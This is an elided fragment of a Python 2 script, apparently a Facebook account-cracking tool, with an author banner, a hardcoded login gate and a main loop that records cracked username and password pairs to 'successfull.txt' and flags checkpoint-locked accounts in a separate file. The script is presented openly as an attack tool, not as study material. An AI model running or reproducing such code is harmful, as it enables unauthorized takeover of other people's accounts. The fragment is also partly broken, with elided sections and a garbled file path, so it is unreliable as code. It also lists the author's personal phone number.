...
\_/\_\\_/ \|\_|\_\\_/\____/
  ...
  Auther  : MR RAKIB                                Github  :  MRRAKIB-404
  Whapp   :  0531382117
...
"""[1;33;40m--------------------------------------------------\n  \x1b[1;36;40mAuthor     \x1b[1;33;40m: \x1b[0;37;40mMR RAKIB\n  \x1b[1;36;40mwhatapp    \x1b[1;33;40m: \x1b[0;37;40m0531382117\n  \x1b[1;36;40mFacebook   \x1b[1;33;40m: \x1b[0;37;40mMr Rakib\n  \x1b[1;36;40mPublic     \x1b[1;33;40m: \x1b[0;37;40m12-05-2022\n\x1b[1;33;40m--------------------------------------------------\n  """                            

os.system('clear')
print logo
CorrectUsername = 'Rakib'
CorrectPassword = 'Xakib'
loop = 'true'
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://github.com/MRRAKIB-404')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*Rakib Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('Rakib/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[RAKIB(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('RAKIBhttps://www.facebook.com/Itz.RAKiB.Sakib.Take.love/checkpoint.txt', 'a')
